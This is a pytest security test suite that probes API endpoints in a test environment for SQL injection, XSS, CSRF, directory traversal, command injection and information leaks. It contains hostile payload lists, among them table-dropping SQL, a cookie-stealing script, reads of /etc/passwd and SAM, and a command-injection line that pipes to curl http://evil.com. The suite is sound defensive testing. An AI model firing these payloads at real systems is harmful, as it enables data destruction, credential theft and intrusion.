"""
Security validation tests for API endpoints.
Tests for common web vulnerabilities like XSS, CSRF, injection attacks.
"""

import pytest
import asyncio
import httpx
import json
import time
import base64
import urllib.parse
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
import logging

logger = logging.getLogger(__name__)


@dataclass
class APISecurityResult:
    """API security test result"""
    test_name: str
    endpoint: str
    vulnerability_found: bool
    severity: str
    description: str
    payload: Optional[str] = None
    response_evidence: Optional[Dict[str, Any]] = None
    recommendation: Optional[str] = None


@pytest.mark.security
class TestAPISecurityVulnerabilities:
    """Test API security vulnerabilities"""

    @pytest.fixture(autouse=True)
    async def setup_api_security_test(self, test_environment):
        """Setup API security testing environment"""
        self.test_environment = test_environment
        self.security_results = []
        self.test_token = await self._get_test_token()
        
        yield
        
        # Generate security report
        await self.generate_api_security_report()

    async def test_sql_injection_vulnerabilities(self, test_data_factory):
        """Test SQL injection vulnerabilities in API endpoints"""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "' OR 1=1--",
            "'; INSERT INTO users VALUES('hacker','password'); --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "1' AND SLEEP(5)--"
        ]
        
        # Test endpoints that might be vulnerable
        test_endpoints = [
            {
                "method": "GET",
                "url": f"{self.test_environment.api_gateway_url}/api/users",
                "param_name": "search",
                "auth_required": True
            },
            {
                "method": "GET", 
                "url": f"{self.test_environment.api_gateway_url}/api/tables",
                "param_name": "filter",
                "auth_required": True
            },
            {
                "method": "POST",
                "url": f"{self.test_environment.api_gateway_url}/api/search",
                "param_name": "query",
                "auth_required": True
            },
            {
                "method": "GET",
                "url": f"{self.test_environment.airtable_gateway_url}/records",
                "param_name": "table_id",
                "auth_required": False
            }
        ]
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            for endpoint in test_endpoints:
                for payload in sql_payloads:
                    await self._test_sql_injection_endpoint(
                        client, endpoint, payload
                    )

    async def _test_sql_injection_endpoint(self, client: httpx.AsyncClient, endpoint: Dict, payload: str):
        """Test SQL injection on a specific endpoint"""
        headers = {}
        if endpoint["auth_required"] and self.test_token:
            headers["Authorization"] = f"Bearer {self.test_token}"
        
        start_time = time.time()
        
        try:
            if endpoint["method"] == "GET":
                # Test as URL parameter
                params = {endpoint["param_name"]: payload}
                response = await client.get(
                    endpoint["url"],
                    params=params,
                    headers=headers
                )
            else:
                # Test as JSON payload
                json_data = {endpoint["param_name"]: payload}
                response = await client.post(
                    endpoint["url"],
                    json=json_data,
                    headers=headers
                )
            
            response_time = time.time() - start_time
            
            # Analyze response for SQL injection indicators
            vulnerability_indicators = self._analyze_sql_injection_response(
                response, payload, response_time
            )
            
            if vulnerability_indicators:
                result = APISecurityResult(
                    test_name="SQL Injection",
                    endpoint=endpoint["url"],
                    vulnerability_found=True,
                    severity="critical",
                    description=f"SQL injection vulnerability detected: {vulnerability_indicators}",
                    payload=payload,
                    response_evidence={
                        "status_code": response.status_code,
                        "response_time": response_time,
                        "indicators": vulnerability_indicators
                    },
                    recommendation="Use parameterized queries and input validation"
                )
                
                self.security_results.append(result)
        
        except Exception as e:
            logger.warning(f"SQL injection test failed for {endpoint['url']} with payload '{payload}': {e}")

    def _analyze_sql_injection_response(self, response: httpx.Response, payload: str, response_time: float) -> List[str]:
        """Analyze response for SQL injection vulnerability indicators"""
        indicators = []
        
        # Time-based SQL injection detection
        if "SLEEP" in payload.upper() and response_time > 4:
            indicators.append("Time-based SQL injection (response delayed)")
        
        # Error-based SQL injection detection
        if response.status_code >= 500:
            error_text = response.text.lower()
            sql_error_keywords = [
                "sql syntax", "mysql", "postgresql", "sqlite", "ora-", 
                "microsoft odbc", "driver", "database", "table", "column"
            ]
            
            for keyword in sql_error_keywords:
                if keyword in error_text:
                    indicators.append(f"SQL error message detected: {keyword}")
                    break
        
        # Union-based SQL injection detection
        if "UNION" in payload.upper() and response.status_code == 200:
            try:
                response_data = response.json()
                if isinstance(response_data, list) and len(response_data) > 100:
                    indicators.append("Union-based SQL injection (abnormal data volume)")
            except:
                pass
        
        # Boolean-based SQL injection detection
        if "1=1" in payload and response.status_code == 200:
            try:
                response_data = response.json()
                if isinstance(response_data, list) and len(response_data) > 0:
                    indicators.append("Boolean-based SQL injection (tautology)")
            except:
                pass
        
        return indicators

    async def test_xss_vulnerabilities(self, test_data_factory):
        """Test Cross-Site Scripting (XSS) vulnerabilities"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "<script>document.cookie='stolen='+document.cookie</script>"
        ]
        
        # Test endpoints that might reflect user input
        test_endpoints = [
            {
                "method": "POST",
                "url": f"{self.test_environment.api_gateway_url}/api/feedback",
                "field": "message",
                "auth_required": False
            },
            {
                "method": "POST",
                "url": f"{self.test_environment.api_gateway_url}/api/comments",
                "field": "content",
                "auth_required": True
            },
            {
                "method": "PUT",
                "url": f"{self.test_environment.api_gateway_url}/auth/profile",
                "field": "bio",
                "auth_required": True
            },
            {
                "method": "GET",
                "url": f"{self.test_environment.api_gateway_url}/api/search",
                "field": "q",
                "auth_required": False
            }
        ]
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            for endpoint in test_endpoints:
                for payload in xss_payloads:
                    await self._test_xss_endpoint(client, endpoint, payload)

    async def _test_xss_endpoint(self, client: httpx.AsyncClient, endpoint: Dict, payload: str):
        """Test XSS on a specific endpoint"""
        headers = {}
        if endpoint["auth_required"] and self.test_token:
            headers["Authorization"] = f"Bearer {self.test_token}"
        
        try:
            if endpoint["method"] == "GET":
                params = {endpoint["field"]: payload}
                response = await client.get(
                    endpoint["url"],
                    params=params,
                    headers=headers
                )
            else:
                json_data = {endpoint["field"]: payload}
                response = await client.request(
                    endpoint["method"],
                    endpoint["url"],
                    json=json_data,
                    headers=headers
                )
            
            # Check if payload is reflected in response
            if payload in response.text:
                # Check if it's properly escaped
                escaped_indicators = [
                    "&lt;script&gt;", "&lt;img", "&amp;lt;", 
                    "\\u003cscript\\u003e", "&quot;", "&#x27;"
                ]
                
                is_escaped = any(indicator in response.text for indicator in escaped_indicators)
                
                if not is_escaped:
                    result = APISecurityResult(
                        test_name="Cross-Site Scripting (XSS)",
                        endpoint=endpoint["url"],
                        vulnerability_found=True,
                        severity="high",
                        description="XSS vulnerability - user input not properly sanitized",
                        payload=payload,
                        response_evidence={
                            "status_code": response.status_code,
                            "reflected_payload": payload in response.text,
                            "properly_escaped": is_escaped
                        },
                        recommendation="Implement proper output encoding and Content Security Policy"
                    )
                    
                    self.security_results.append(result)
        
        except Exception as e:
            logger.warning(f"XSS test failed for {endpoint['url']} with payload '{payload}': {e}")

    async def test_csrf_protection(self, test_data_factory):
        """Test Cross-Site Request Forgery (CSRF) protection"""
        # State-changing endpoints that should have CSRF protection
        csrf_test_endpoints = [
            {
                "method": "POST",
                "url": f"{self.test_environment.api_gateway_url}/api/users",
                "data": test_data_factory.create_user_data()
            },
            {
                "method": "DELETE",
                "url": f"{self.test_environment.api_gateway_url}/api/users/123",
                "data": {}
            },
            {
                "method": "PUT",
                "url": f"{self.test_environment.api_gateway_url}/auth/profile",
                "data": {"first_name": "Modified"}
            },
            {
                "method": "POST",
                "url": f"{self.test_environment.api_gateway_url}/api/tables",
                "data": {"name": "CSRF Test Table"}
            }
        ]
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            for endpoint in csrf_test_endpoints:
                await self._test_csrf_endpoint(client, endpoint)

    async def _test_csrf_endpoint(self, client: httpx.AsyncClient, endpoint: Dict):
        """Test CSRF protection on specific endpoint"""
        try:
            # Test 1: Request without CSRF token
            headers = {}
            if self.test_token:
                headers["Authorization"] = f"Bearer {self.test_token}"
            
            response = await client.request(
                endpoint["method"],
                endpoint["url"],
                json=endpoint["data"],
                headers=headers
            )
            
            # Test 2: Request with potentially forged origin
            forged_headers = headers.copy()
            forged_headers.update({
                "Origin": "https://evil-site.com",
                "Referer": "https://evil-site.com/csrf-attack.html"
            })
            
            forged_response = await client.request(
                endpoint["method"],
                endpoint["url"],
                json=endpoint["data"],
                headers=forged_headers
            )
            
            # Analyze CSRF protection
            csrf_issues = []
            
            # Check if requests from different origins are accepted
            if forged_response.status_code in [200, 201, 202]:
                csrf_issues.append("Accepts requests from different origins")
            
            # Check for CSRF token requirements
            csrf_headers = ["X-CSRF-Token", "X-XSRF-TOKEN", "CSRF-Token"]
            requires_csrf_token = any(
                header.lower() in [h.lower() for h in response.headers.keys()]
                for header in csrf_headers
            )
            
            if not requires_csrf_token and response.status_code in [200, 201, 202]:
                csrf_issues.append("No CSRF token required")
            
            # Check SameSite cookie attribute (would need to inspect Set-Cookie headers)
            set_cookie_headers = response.headers.get_list("Set-Cookie") or []
            has_samesite = any("SameSite" in cookie for cookie in set_cookie_headers)
            
            if not has_samesite and set_cookie_headers:
                csrf_issues.append("Cookies lack SameSite attribute")
            
            if csrf_issues:
                result = APISecurityResult(
                    test_name="Cross-Site Request Forgery (CSRF)",
                    endpoint=endpoint["url"],
                    vulnerability_found=True,
                    severity="high",
                    description=f"CSRF protection issues: {', '.join(csrf_issues)}",
                    response_evidence={
                        "normal_status": response.status_code,
                        "forged_status": forged_response.status_code,
                        "issues": csrf_issues
                    },
                    recommendation="Implement CSRF tokens, check Origin/Referer headers, use SameSite cookies"
                )
                
                self.security_results.append(result)
        
        except Exception as e:
            logger.warning(f"CSRF test failed for {endpoint['url']}: {e}")

    async def test_directory_traversal(self):
        """Test directory traversal vulnerabilities"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/../../../etc/passwd",
            "C:\\windows\\system32\\config\\SAM"
        ]
        
        # Test file-related endpoints
        file_endpoints = [
            f"{self.test_environment.api_gateway_url}/api/files/download",
            f"{self.test_environment.api_gateway_url}/api/attachments",
            f"{self.test_environment.api_gateway_url}/static",
            f"{self.test_environment.api_gateway_url}/uploads"
        ]
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            for endpoint in file_endpoints:
                for payload in traversal_payloads:
                    await self._test_directory_traversal(client, endpoint, payload)

    async def _test_directory_traversal(self, client: httpx.AsyncClient, endpoint: str, payload: str):
        """Test directory traversal on specific endpoint"""
        try:
            # Test as path parameter
            test_url = f"{endpoint}/{payload}"
            response = await client.get(test_url)
            
            # Test as query parameter
            params = {"file": payload, "path": payload, "filename": payload}
            param_response = await client.get(endpoint, params=params)
            
            # Check for directory traversal indicators
            for test_response in [response, param_response]:
                if self._detect_directory_traversal(test_response, payload):
                    result = APISecurityResult(
                        test_name="Directory Traversal",
                        endpoint=endpoint,
                        vulnerability_found=True,
                        severity="high",
                        description="Directory traversal vulnerability detected",
                        payload=payload,
                        response_evidence={
                            "status_code": test_response.status_code,
                            "response_length": len(test_response.text),
                            "suspicious_content": True
                        },
                        recommendation="Validate and sanitize file paths, use whitelist approach"
                    )
                    
                    self.security_results.append(result)
                    break
        
        except Exception as e:
            logger.warning(f"Directory traversal test failed for {endpoint} with payload '{payload}': {e}")

    def _detect_directory_traversal(self, response: httpx.Response, payload: str) -> bool:
        """Detect directory traversal vulnerability indicators"""
        if response.status_code != 200:
            return False
        
        # Check for system file contents
        system_file_indicators = [
            "root:x:", "daemon:x:", "bin:x:",  # /etc/passwd
            "127.0.0.1", "localhost",  # hosts file
            "[boot loader]", "[operating systems]",  # Windows boot.ini
            "# This file", "# hosts file"  # Common file headers
        ]
        
        response_text = response.text.lower()
        
        for indicator in system_file_indicators:
            if indicator.lower() in response_text:
                return True
        
        # Check if response is suspiciously long (indicating file content)
        if len(response.text) > 1000 and "etc/passwd" in payload:
            return True
        
        return False

    async def test_command_injection(self):
        """Test command injection vulnerabilities"""
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "; cat /etc/passwd",
            "$(whoami)",
            "`whoami`",
            "; ping -c 4 127.0.0.1",
            "| curl http://evil.com",
            "; sleep 10"
        ]
        
        # Test endpoints that might execute system commands
        command_endpoints = [
            {
                "url": f"{self.test_environment.api_gateway_url}/api/system/ping",
                "param": "host"
            },
            {
                "url": f"{self.test_environment.api_gateway_url}/api/tools/convert",
                "param": "filename"
            },
            {
                "url": f"{self.test_environment.api_gateway_url}/api/export",
                "param": "format"
            }
        ]
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            for endpoint in command_endpoints:
                for payload in command_payloads:
                    await self._test_command_injection(client, endpoint, payload)

    async def _test_command_injection(self, client: httpx.AsyncClient, endpoint: Dict, payload: str):
        """Test command injection on specific endpoint"""
        try:
            headers = {}
            if self.test_token:
                headers["Authorization"] = f"Bearer {self.test_token}"
            
            start_time = time.time()
            
            # Test as POST parameter
            response = await client.post(
                endpoint["url"],
                json={endpoint["param"]: f"test{payload}"},
                headers=headers
            )
            
            response_time = time.time() - start_time
            
            # Check for command injection indicators
            if self._detect_command_injection(response, payload, response_time):
                result = APISecurityResult(
                    test_name="Command Injection",
                    endpoint=endpoint["url"],
                    vulnerability_found=True,
                    severity="critical",
                    description="Command injection vulnerability detected",
                    payload=payload,
                    response_evidence={
                        "status_code": response.status_code,
                        "response_time": response_time,
                        "response_length": len(response.text)
                    },
                    recommendation="Never execute user input directly, use parameterized commands"
                )
                
                self.security_results.append(result)
        
        except Exception as e:
            logger.warning(f"Command injection test failed for {endpoint['url']} with payload '{payload}': {e}")

    def _detect_command_injection(self, response: httpx.Response, payload: str, response_time: float) -> bool:
        """Detect command injection vulnerability indicators"""
        # Time-based detection for sleep commands
        if "sleep" in payload and response_time > 8:
            return True
        
        # Output-based detection
        command_output_indicators = [
            "uid=", "gid=", "groups=",  # whoami output
            "drwx", "-rw-",  # ls output
            "PING", "64 bytes from",  # ping output
            "total ", "root:x:",  # file listing/content
        ]
        
        response_text = response.text
        
        for indicator in command_output_indicators:
            if indicator in response_text:
                return True
        
        return False

    async def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        # Test endpoints that might leak sensitive information
        info_endpoints = [
            f"{self.test_environment.api_gateway_url}/api/debug",
            f"{self.test_environment.api_gateway_url}/api/status",
            f"{self.test_environment.api_gateway_url}/api/config",
            f"{self.test_environment.api_gateway_url}/api/health/detailed",
            f"{self.test_environment.api_gateway_url}/.env",
            f"{self.test_environment.api_gateway_url}/config.json",
            f"{self.test_environment.api_gateway_url}/api/version",
            f"{self.test_environment.api_gateway_url}/server-info"
        ]
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            for endpoint in info_endpoints:
                await self._test_information_disclosure(client, endpoint)

    async def _test_information_disclosure(self, client: httpx.AsyncClient, endpoint: str):
        """Test information disclosure on specific endpoint"""
        try:
            response = await client.get(endpoint)
            
            if response.status_code == 200:
                sensitive_info = self._detect_sensitive_information(response.text)
                
                if sensitive_info:
                    result = APISecurityResult(
                        test_name="Information Disclosure",
                        endpoint=endpoint,
                        vulnerability_found=True,
                        severity="medium",
                        description=f"Sensitive information disclosed: {', '.join(sensitive_info)}",
                        response_evidence={
                            "status_code": response.status_code,
                            "sensitive_info": sensitive_info,
                            "response_length": len(response.text)
                        },
                        recommendation="Remove sensitive information from public endpoints"
                    )
                    
                    self.security_results.append(result)
        
        except Exception as e:
            logger.warning(f"Information disclosure test failed for {endpoint}: {e}")

    def _detect_sensitive_information(self, response_text: str) -> List[str]:
        """Detect sensitive information in response"""
        sensitive_patterns = {
            "API Keys": ["api_key", "apikey", "api-key", "secret_key", "access_token"],
            "Database Info": ["database", "db_host", "db_password", "connection_string"],
            "File Paths": ["/etc/", "/var/", "c:\\", "program files"],
            "IP Addresses": ["127.0.0.1", "192.168.", "10.0.0.", "172.16."],
            "Version Info": ["version", "build", "commit", "branch"],
            "Error Stack Traces": ["traceback", "stack trace", "exception", "at line"],
            "Environment Variables": ["env", "environment", "config", "settings"]
        }
        
        found_info = []
        response_lower = response_text.lower()
        
        for category, patterns in sensitive_patterns.items():
            for pattern in patterns:
                if pattern in response_lower:
                    found_info.append(category)
                    break
        
        return found_info

    async def _get_test_token(self) -> str:
        """Get authentication token for testing"""
        try:
            async with httpx.AsyncClient(timeout=30.0) as client:
                response = await client.post(
                    f"{self.test_environment.auth_service_url}/auth/login",
                    json={
                        "email": "test@example.com",
                        "password": "test_password"
                    }
                )
                if response.status_code == 200:
                    return response.json().get("access_token", "")
        except Exception:
            pass
        
        return ""

    async def generate_api_security_report(self):
        """Generate comprehensive API security report"""
        if not self.security_results:
            return
        
        # Categorize by severity
        critical_issues = [r for r in self.security_results if r.severity == "critical"]
        high_issues = [r for r in self.security_results if r.severity == "high"]
        medium_issues = [r for r in self.security_results if r.severity == "medium"]
        low_issues = [r for r in self.security_results if r.severity == "low"]
        
        # Create report
        report = {
            "summary": {
                "total_tests": len(self.security_results),
                "vulnerabilities_found": len([r for r in self.security_results if r.vulnerability_found]),
                "critical": len(critical_issues),
                "high": len(high_issues),
                "medium": len(medium_issues),
                "low": len(low_issues)
            },
            "vulnerabilities_by_type": {},
            "results": []
        }
        
        # Group by vulnerability type
        vuln_types = {}
        for result in self.security_results:
            if result.vulnerability_found:
                vuln_type = result.test_name
                if vuln_type not in vuln_types:
                    vuln_types[vuln_type] = []
                vuln_types[vuln_type].append(result)
        
        report["vulnerabilities_by_type"] = {
            vtype: len(vulns) for vtype, vulns in vuln_types.items()
        }
        
        for result in self.security_results:
            report["results"].append({
                "test_name": result.test_name,
                "endpoint": result.endpoint,
                "vulnerability_found": result.vulnerability_found,
                "severity": result.severity,
                "description": result.description,
                "payload": result.payload,
                "response_evidence": result.response_evidence,
                "recommendation": result.recommendation
            })
        
        # Save report
        import os
        os.makedirs("tests/reports/security", exist_ok=True)
        
        import aiofiles
        async with aiofiles.open("tests/reports/security/api_security_report.json", 'w') as f:
            await f.write(json.dumps(report, indent=2))
        
        # Log summary
        logger.info("API Security Test Results:")
        logger.info(f"  Total Tests: {report['summary']['total_tests']}")
        logger.info(f"  Vulnerabilities Found: {report['summary']['vulnerabilities_found']}")
        logger.info(f"  Critical: {report['summary']['critical']}")
        logger.info(f"  High: {report['summary']['high']}")
        logger.info(f"  Medium: {report['summary']['medium']}")
        logger.info(f"  Low: {report['summary']['low']}")
        
        if report["vulnerabilities_by_type"]:
            logger.info("  Vulnerability Types:")
            for vtype, count in report["vulnerabilities_by_type"].items():
                logger.info(f"    {vtype}: {count}")
        
        for result in self.security_results:
            if result.vulnerability_found:
                logger.warning(f"  ⚠️  {result.test_name} at {result.endpoint}: {result.description}")
            else:
                logger.info(f"  ✅ {result.test_name}: Passed")